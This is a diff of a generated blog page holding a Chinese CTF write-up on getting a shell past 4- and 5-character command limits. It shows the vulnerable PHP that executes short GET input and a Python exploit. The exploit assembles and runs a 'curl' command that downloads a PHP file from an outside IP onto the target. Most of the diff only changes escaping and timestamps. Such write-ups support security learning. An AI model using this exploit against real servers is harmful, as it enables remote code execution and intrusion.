@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2020-06-02T00:00:00+00:00",
-        "dateModified": "2022-10-30T10:47:31+08:00",
+        "dateModified": "2022-10-30T10:47:32+08:00",
         "url": "https://blog.wh1sper.com/posts/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/",
         "headline": "绕过4-5个字符限制getshell",
         "description": "由一道CTF题目探究绕过4，\t5个字符限制getshell",
@@ -107,7 +107,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170817.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2020-06-02T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-10-30T10:47:31&#43;08:00" />
+    <meta property="article:modified_time" content="2022-10-30T10:47:32&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -244,7 +244,7 @@
     
     
         
-        <time datetime="2022-10-30T10:47:31&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
+        <time datetime="2022-10-30T10:47:32&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
     
     
     
@@ -302,24 +302,24 @@
 <h3 id="源码"><a href="#源码" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:源码" class="headings">源码</a></h3>
 <p>五字版本</p>
 <pre tabindex="0"><code>&lt;?php
-    $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']);
+    $sandbox = &#39;/www/sandbox/&#39; . md5(&#34;orange&#34; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
     @mkdir($sandbox);
     @chdir($sandbox);
-    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) {
-        @exec($_GET['cmd']);
-    } else if (isset($_GET['reset'])) {
-        @exec('/bin/rm -rf ' . $sandbox);
+    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {
+        @exec($_GET[&#39;cmd&#39;]);
+    } else if (isset($_GET[&#39;reset&#39;])) {
+        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
     }
     highlight_file(__FILE__);
 </code></pre><p>四字版本：</p>
 <pre tabindex="0"><code>&lt;?php
-    $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']);
+    $sandbox = &#39;/www/sandbox/&#39; . md5(&#34;orange&#34; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
     @mkdir($sandbox);
     @chdir($sandbox);
-    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 4) {
-        @exec($_GET['cmd']);
-    } else if (isset($_GET['reset'])) {
-        @exec('/bin/rm -rf ' . $sandbox);
+    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 4) {
+        @exec($_GET[&#39;cmd&#39;]);
+    } else if (isset($_GET[&#39;reset&#39;])) {
+        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
     }
     highlight_file(__FILE__);
 </code></pre><h3 id="预备知识"><a href="#预备知识" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:预备知识" class="headings">预备知识</a></h3>
@@ -346,39 +346,39 @@
 <pre tabindex="0"><code>import requests
 import time
 
-host = '127.0.0.1'
+host = &#39;127.0.0.1&#39;
 
 playload = [
- # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;
-    '&gt;dir',
-    '&gt;g\&gt;',
-    '&gt;ht-',
-    '&gt;sl',
-    '*&gt;v',
- # reverse file &quot;v&quot; to file &quot;h&quot;, content &quot;ls -th &gt;g&quot;
-    '&gt;rev',
-    '*v&gt;h',
-  # generate &quot;curl 59.xx0.x5x.4&gt;p.php&quot;
-    '&gt;\;\\',
-    '&gt;p',
-    '&gt;ph\\',
-    '&gt;p.\\',
-    '&gt;\&gt;\\',
-    '&gt;4\\',
-    '&gt;5x.\\',
-    '&gt;0.x\\',
-    '&gt;xx\\',
-    '&gt;59.\\',
-    '&gt;\ \\',
-    '&gt;rl\\',
-    '&gt;cu\\',
-    'sh h',
-    'sh g',
+ # generate &#34;g&gt; ht- sl&#34; to file &#34;v&#34;
+    &#39;&gt;dir&#39;,
+    &#39;&gt;g\&gt;&#39;,
+    &#39;&gt;ht-&#39;,
+    &#39;&gt;sl&#39;,
+    &#39;*&gt;v&#39;,
+ # reverse file &#34;v&#34; to file &#34;h&#34;, content &#34;ls -th &gt;g&#34;
+    &#39;&gt;rev&#39;,
+    &#39;*v&gt;h&#39;,
+  # generate &#34;curl 59.xx0.x5x.4&gt;p.php&#34;
+    &#39;&gt;\;\\&#39;,
+    &#39;&gt;p&#39;,
+    &#39;&gt;ph\\&#39;,
+    &#39;&gt;p.\\&#39;,
+    &#39;&gt;\&gt;\\&#39;,
+    &#39;&gt;4\\&#39;,
+    &#39;&gt;5x.\\&#39;,
+    &#39;&gt;0.x\\&#39;,
+    &#39;&gt;xx\\&#39;,
+    &#39;&gt;59.\\&#39;,
+    &#39;&gt;\ \\&#39;,
+    &#39;&gt;rl\\&#39;,
+    &#39;&gt;cu\\&#39;,
+    &#39;sh h&#39;,
+    &#39;sh g&#39;,
 ]
 
 for i in playload:
     cmd = i
-    r = requests.get(host + '?cmd=' + i)
+    r = requests.get(host + &#39;?cmd=&#39; + i)
     #print(r.text)
     time.sleep(0.2)
 </code></pre><p>这是5字版本的exp，4字版本只需要改一下自己的IP。</p>
@@ -413,7 +413,7 @@ for i in playload:
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-10-30 10:47:31 CST" style="cursor:help">
+        <span title="Updated @ 2022-10-30 10:47:32 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-10-30</text></g></svg>
         </span></div>
